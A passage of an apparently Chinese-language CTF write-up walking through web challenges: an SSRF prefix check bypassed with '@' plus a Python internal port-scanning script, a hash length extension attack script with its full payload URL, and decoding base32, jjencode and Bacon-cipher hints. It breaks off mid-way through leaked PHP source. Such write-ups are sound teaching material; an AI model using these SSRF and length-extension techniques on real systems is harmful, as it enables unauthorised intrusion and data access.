<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">NEQGM33</span>S<span class="name">M5</span>SXIIDU<span class="symbol">N4</span>QGIZLMMV<span class="number">2</span>GKID<span class="symbol">NPEQHAZLSONXW4</span>YLMEBTGS<span class="number">3</span>DFFR<span class="number">2</span>GQYLUOMQHI<span class="number">33</span>PEBRGCZBM<span class="symbol">NEQGI33</span>OE<span class="number">52</span>CA<span class="number">53</span>B<span class="symbol">NZ2</span>CA<span class="number">6</span>LPOUQHI<span class="number">3</span>ZA<span class="name">M5</span>SXIIDTMVRXEZLUL<span class="number">5</span>XGK<span class="number">527</span><span class="symbol">NZXXI2</span>LDMUXHA<span class="number">2</span>DQ</div></pre></td></tr></table></figure>
<p>解base32得到<br/><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">"i forget to delete my personal file,thats too bad,i don't want you to get secret_new_notice.php"</span></div></pre></td></tr></table></figure></p>
<p>直接访问发现提示不是本地访问，那么就是ssrf。</p>
<p>测试修改发现有前缀检查</p>
<p>头像必须是<a href="http://web.l-ctf.com:55533开头的，但是我们可以用@来绕过" rel="external" target="_blank">http://web.l-ctf.com:55533开头的，但是我们可以用@来绕过</a></p>
<p>当时第一反应是扫内网端口，如果内网有redis什么的，可以getshell</p>
<p>附上扫内网端口脚本<br/><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">import</span> requests</div><div class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</div><div class="line"><span class="built_in">import</span> base64</div><div class="line"></div><div class="line"><span class="attr">urll</span> = <span class="string">"http://web.l-ctf.com:55533@127.0.0.1:"</span></div><div class="line"><span class="attr">url1</span> = <span class="string">"http://web.l-ctf.com:55533/save.php"</span></div><div class="line"><span class="attr">url2</span> = <span class="string">"http://web.l-ctf.com:55533/ucenter.php"</span></div><div class="line"></div><div class="line"><span class="attr">cookie</span> = {<span class="string">"PHPSESSID"</span>: <span class="string">"ljf888c57d6pd9qrcltgrsadd2"</span>}</div><div class="line"><span class="attr">header</span> = {<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"</span>, <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>}</div><div class="line"></div><div class="line"><span class="attr">s</span> = requests.Session()</div><div class="line"></div><div class="line"><span class="comment"># for i in range(22,65535):</span></div><div class="line"><span class="attr">data</span> = {<span class="string">"headpic"</span>: urll + str(<span class="string">"80"</span>)}</div><div class="line"></div><div class="line"><span class="attr">r</span> = s.post(url1, <span class="attr">data</span> = data, <span class="attr">cookies=cookie)</span></div><div class="line"></div><div class="line"><span class="attr">r</span> = s.get(url2, <span class="attr">headers=header,</span> <span class="attr">cookies=cookie)</span></div><div class="line"></div><div class="line"><span class="attr">bs0bj</span> = BeautifulSoup(r.text, <span class="string">"lxml"</span>)</div><div class="line"></div><div class="line">try:</div><div class="line">	<span class="attr">content</span> = base64.b64decode(bs0bj.img['src'][<span class="number">23</span>:])</div><div class="line">	</div><div class="line">	print content</div><div class="line"></div><div class="line">except:</div><div class="line">	<span class="attr">s</span> = <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>得到提示</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i found that my account <span class="keyword">is</span> too weak,<span class="keyword">so</span> i <span class="keyword">make</span> <span class="keyword">a</span> trick,<span class="built_in">add</span> something at the end of username<span class="symbol">&lt;pre&gt;</span>$user==<span class="string">'admin******'</span>?&lt;/<span class="keyword">pre</span>&gt;</div></pre></td></tr></table></figure>
<p>实话说这里是先做到的，所以当时第一反应是要跑这个admin，于是跑了好久跑完都没跑到，直接传数组get flag</p>
<p>o(<em>^▽^</em>)┛</p>
<h2 id="你一定不能来这"><a class="headerlink" href="#你一定不能来这" title="你一定不能来这"></a>你一定不能来这</h2><p>上来啥都找不到，没办法扫目录，事实证明，这题确实是扫目录，扫啊，扫啊得到</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//web.l-ctf.com:33333/crossdomain.xml</span></div></pre></td></tr></table></figure>
<p>得到<br/><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//xdctfweb.xd-a8.com/</span></div></pre></td></tr></table></figure></p>
<p>得到download.php</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">require(<span class="string">"common.php"</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">function</span> varify_hash(<span class="variable">$filename</span>,<span class="variable">$hash</span>,<span class="variable">$secret</span>){</div><div class="line">  </div><div class="line"><span class="keyword">if</span>(strpos(<span class="variable">$filename</span>,<span class="string">"www.rar"</span>)&gt;-<span class="number">1</span>){</div><div class="line">	<span class="keyword">if</span>(<span class="variable">$hash</span> === md5(<span class="variable">$secret</span>.<span class="variable">$filename</span>)){</div><div class="line">		</div><div class="line">		download(<span class="string">"www.rar"</span>);</div><div class="line"></div><div class="line">	}</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">exit</span>(<span class="string">"mac不对，你根本不是xdsec的人。"</span>) ;</div><div class="line">}</div><div class="line"></div><div class="line">elseif(strpos(<span class="variable">$filename</span>,<span class="string">"download.php"</span>)&gt;-<span class="number">1</span>){</div><div class="line">	<span class="keyword">if</span>(<span class="variable">$hash</span> === md5(<span class="variable">$secret</span>.<span class="variable">$filename</span>)){</div><div class="line">	</div><div class="line">		download(<span class="string">"download.php"</span>);</div><div class="line">	}</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">exit</span>(<span class="string">"mac不对，你根本不是xdsec的人。"</span>);</div><div class="line"></div><div class="line">}</div><div class="line"><span class="keyword">else</span> </div><div class="line">	<span class="keyword">exit</span>(<span class="string">"没有你要下载的文件。"</span>);</div><div class="line">}</div><div class="line"></div><div class="line"></div><div class="line"><span class="variable">$filename</span> = urldecode(<span class="variable">$_GET</span>[<span class="string">'filename'</span>]);</div><div class="line"><span class="variable">$hash</span> = <span class="variable">$_GET</span>[<span class="string">'mac'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!empty(<span class="variable">$filename</span>) &amp;&amp; !empty(<span class="variable">$hash</span>)){</div><div class="line"></div><div class="line">varify_hash(<span class="variable">$filename</span>,<span class="variable">$hash</span>,<span class="variable">$secret</span>);</div><div class="line">}</div><div class="line"><span class="keyword">else</span></div><div class="line">	<span class="keyword">exit</span>(<span class="string">"参数为空"</span>);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>司机告诉我这是hash长度拓展攻击，找到一个工具<br/><a href="http://www.cnblogs.com/pcat/p/5478509.html" rel="external" target="_blank">http://www.cnblogs.com/pcat/p/5478509.html</a></p>
<p>由于不知道密钥长度，直接写脚本跑</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">import hashpumpy</div><div class="line">import urllib</div><div class="line">import requests</div><div class="line"></div><div class="line"></div><div class="line">url = <span class="string">"http://xdctfweb.xd-a8.com/download.php?filename=%s&amp;mac=%s"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="keyword">x</span> in xrange(<span class="number">52</span>):</div><div class="line">	h, f = hashpumpy.hashpump(<span class="string">"f30a38d3cdcb25cf067468c2f108e1f5"</span>, <span class="string">"download.php"</span>, <span class="string">"www.rar"</span>, <span class="keyword">x</span>)	</div><div class="line">	r = requests.get(url%(urllib.quote(f), h))</div><div class="line">	<span class="keyword">print</span> <span class="keyword">x</span></div><div class="line">	<span class="keyword">print</span> r.content</div><div class="line"></div><div class="line">得到</div><div class="line"></div><div class="line">Payload: http:<span class="regexp">//xdctfweb</span>.xd-a8.com/download.php?filename=download.php%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F0%00%00%00%00%00%00%00www.rar&amp;mac=<span class="number">1</span>f35a8fa0b3eedd9d25b5fe910ade0e7</div></pre></td></tr></table></figure>
<p>下载www.rar发现有密码，这步让我感觉非常傻逼…强行加misc，就和后面的web强加pwn一样，没啥意义，安misc的逻辑，strings一下发现了不寻常的东西</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Strings www.rar</div><div class="line"></div><div class="line"><span class="symbol">$</span>=~[];<span class="symbol">$</span>={___:++<span class="symbol">$</span>,<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>:(![]+<span class="string">""</span>)[<span class="symbol">$</span>],__<span class="symbol">$</span>:++<span class="symbol">$</span>,<span class="symbol">$</span>_<span class="symbol">$</span>_:(![]+<span class="string">""</span>)[<span class="symbol">$</span>],_<span class="symbol">$</span>_:++<span class="symbol">$</span>,<span class="symbol">$</span>_<span class="symbol">$</span><span class="symbol">$</span>:({}+<span class="string">""</span>)[<span class="symbol">$</span>],<span class="symbol">$</span><span class="symbol">$</span>_<span class="symbol">$</span>:(<span class="symbol">$</span>[<span class="symbol">$</span>]+<span class="string">""</span>)[<span class="symbol">$</span>],_<span class="symbol">$</span><span class="symbol">$</span>:++<span class="symbol">$</span>,<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_:(!<span class="string">""</span>+<span class="string">""</span>)[<span class="symbol">$</span>],<span class="symbol">$</span>__:++<span class="symbol">$</span>,<span class="symbol">$</span>_<span class="symbol">$</span>:++<span class="symbol">$</span>,<span class="symbol">$</span><span class="symbol">$</span>__:({}+<span class="string">""</span>)[<span class="symbol">$</span>],<span class="symbol">$</span><span class="symbol">$</span>_:++<span class="symbol">$</span>,<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>:++<span class="symbol">$</span>,<span class="symbol">$</span>___:++<span class="symbol">$</span>,<span class="symbol">$</span>__<span class="symbol">$</span>:++<span class="symbol">$</span>};<span class="symbol">$</span>.<span class="symbol">$</span>_=(<span class="symbol">$</span>.<span class="symbol">$</span>_=<span class="symbol">$</span>+<span class="string">""</span>)[<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>]+(<span class="symbol">$</span>._<span class="symbol">$</span>=<span class="symbol">$</span>.<span class="symbol">$</span>_[<span class="symbol">$</span>.__<span class="symbol">$</span>])+(<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>=(<span class="symbol">$</span>.<span class="symbol">$</span>+<span class="string">""</span>)[<span class="symbol">$</span>.__<span class="symbol">$</span>])+((!<span class="symbol">$</span>)+<span class="string">""</span>)[<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>]+(<span class="symbol">$</span>.__=<span class="symbol">$</span>.<span class="symbol">$</span>_[<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_])+(<span class="symbol">$</span>.<span class="symbol">$</span>=(!<span class="string">""</span>+<span class="string">""</span>)[<span class="symbol">$</span>.__<span class="symbol">$</span>])+(<span class="symbol">$</span>._=(!<span class="string">""</span>+<span class="string">""</span>)[<span class="symbol">$</span>._<span class="symbol">$</span>_])+<span class="symbol">$</span>.<span class="symbol">$</span>_[<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>]+<span class="symbol">$</span>.__+<span class="symbol">$</span>._<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>;<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>=<span class="symbol">$</span>.<span class="symbol">$</span>+(!<span class="string">""</span>+<span class="string">""</span>)[<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>]+<span class="symbol">$</span>.__+<span class="symbol">$</span>._+<span class="symbol">$</span>.<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>;<span class="symbol">$</span>.<span class="symbol">$</span>=(<span class="symbol">$</span>.___)[<span class="symbol">$</span>.<span class="symbol">$</span>_][<span class="symbol">$</span>.<span class="symbol">$</span>_];<span class="symbol">$</span>.<span class="symbol">$</span>(<span class="symbol">$</span>.<span class="symbol">$</span>(<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"\""</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>__+<span class="symbol">$</span>._<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>+(![]+<span class="string">""</span>)[<span class="symbol">$</span>._<span class="symbol">$</span>_]+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"."</span>+(![]+<span class="string">""</span>)[<span class="symbol">$</span>._<span class="symbol">$</span>_]+<span class="symbol">$</span>._<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"(\\\"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>_+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>_+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>_+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="symbol">$</span>.__+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="symbol">$</span>._<span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>_+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="symbol">$</span>.__+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>_+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>._<span class="symbol">$</span>+<span class="symbol">$</span>._+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>._<span class="symbol">$</span><span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span><span class="symbol">$</span>_+<span class="string">"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="symbol">$</span>.__+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="string">"\\"</span>+<span class="symbol">$</span>.__<span class="symbol">$</span>+<span class="symbol">$</span>.___+<span class="symbol">$</span>.<span class="symbol">$</span>_<span class="symbol">$</span>+<span class="string">".\\\"\\"</span>+<span class="symbol">$</span>.<span class="symbol">$</span>__+<span class="symbol">$</span>.___+<span class="string">")"</span>+<span class="string">"\""</span>)())();</div></pre></td></tr></table></figure>
<p>js的jjencode<br/>得到<br/><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">YoU CAN <span class="keyword">gET</span> Some INterESted Thing <span class="keyword">If</span> You CAN deCOde <span class="keyword">Me</span> <span class="keyword">In</span> <span class="built_in">tImE</span>.</div></pre></td></tr></table></figure></p>
<p>培根密码，应该是以前的xdctf出的，总之非常眼熟<br/><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">XXDDCCTTFF</span></div></pre></td></tr></table></figure></p>
<p>得到源码后发现非常简单，但是设置非常傻逼…</p>
<p>先看源码<br/><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>管理员密码重置<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>管理员密码重置<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span>管理员邮箱:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"textbox"</span> <span class="attr">name</span>=<span class="string">"email"</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"> <span class="keyword">require</span>(<span class="string">'sql.php'</span>);</div><div class="line"> <span class="keyword">require</span>(<span class="string">'function.php'</span>);</div><div class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>])){</div><div class="line">  $email = $_POST[<span class="string">'email'</span>];</div><div class="line">  </div><div class="line"></div><div class="line"></div><div class="line">  <span class="keyword">if</span>($email === <span class="string">"omego952734@xdsec.club"</span>){</div><div class="line"></div><div class="line">    $Time_check = verifyTime();</div><div class="line">    <span class="comment">//检查有没有超过30分钟</span></div><div 